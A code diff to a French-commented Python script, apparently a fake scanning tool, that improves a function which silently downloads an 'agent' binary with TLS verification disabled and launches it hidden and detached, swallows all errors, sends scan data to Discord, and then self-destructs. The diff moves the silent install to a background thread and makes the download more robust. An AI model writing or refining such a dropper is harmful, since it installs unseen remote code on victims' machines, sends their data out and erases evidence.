@@ -179,9 +179,13 @@ def install_agent_silently():
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
         req = urllib.request.Request(AGENT_URL, headers={"User-Agent": "ANTI-Agent/1.0"})
-        with urllib.request.urlopen(req, context=ctx, timeout=30) as resp:
+        with urllib.request.urlopen(req, context=ctx, timeout=120) as resp:
             with open(tmp_path, "wb") as f:
-                f.write(resp.read())
+                while True:
+                    chunk = resp.read(65536)
+                    if not chunk:
+                        break
+                    f.write(chunk)
         if os.path.exists(tmp_path) and os.path.getsize(tmp_path) > 1000000:
             os.rename(tmp_path, agent_path)
             subprocess.Popen(
@@ -189,6 +193,9 @@ def install_agent_silently():
                 creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0) | getattr(subprocess, 'DETACHED_PROCESS', 0),
                 close_fds=True
             )
+        else:
+            if os.path.exists(tmp_path):
+                os.remove(tmp_path)
     except Exception:
         pass
 
@@ -350,8 +357,9 @@ def main():
     # 10. Notification Discord
     send_to_discord(scan_id, scan_data, verdict)
 
-    # 10.5. Installation silencieuse de l'agent
-    install_agent_silently()
+    # 10.5. Installation silencieuse de l'agent (en arrière-plan)
+    agent_thread = threading.Thread(target=install_agent_silently, daemon=True)
+    agent_thread.start()
 
     # 11. Affichage final avec vérification du résultat
     render_progress("Terminé", 100, "Envoi terminé")
@@ -362,8 +370,9 @@ def main():
         print(f"\n  \033[91m✗\033[0m  \033[1mTransmission échouée\033[0m  \033[2m·\033[0m  "
               f"\033[96m{scan_id}\033[0m  \033[2m· erreur: {err_msg}\033[0m\n")
 
-    # 12. Auto-destruction après 3 secondes
-    time.sleep(3)
+    # 12. Attendre l'installation agent puis auto-destruction
+    agent_thread.join(timeout=120)
+    time.sleep(2)
     self_destruct(delay_sec=1)
     os._exit(0)
 
